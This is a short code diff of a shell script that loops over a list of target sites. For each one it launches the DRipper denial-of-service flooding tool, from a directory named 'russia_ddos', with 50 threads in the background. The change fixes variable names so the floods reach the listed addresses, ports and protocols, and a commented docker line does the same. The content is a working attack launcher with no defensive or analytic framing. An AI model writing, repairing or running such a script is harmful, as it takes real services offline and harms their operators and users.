@@ -17,9 +17,9 @@ do
         addr=$(echo $site | awk '{print $1}')
         port=$(echo $site | awk '{print $2}')
         prot=$(echo $site | awk '{print $3}')
-        echo $site $addr $port $prot
-        python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr2 -p $port2 -m $prot -t 50&
-#        docker run -t --rm alexmon1989/dripper:latest -l 2048 -s $addr2 -m tcp -p $port2 -t 50&
+        echo $addr $port $prot
+        python3 -u ~/russia_ddos/DRipper.py -l 2048 -s $addr -p $port -m $prot -t 50&
+#        docker run -t --rm alexmon1989/dripper:latest -l 2048 -s $addr -m $prot -p $port -t 50&
 done
 sleep 1200
 #pkill -9 docker
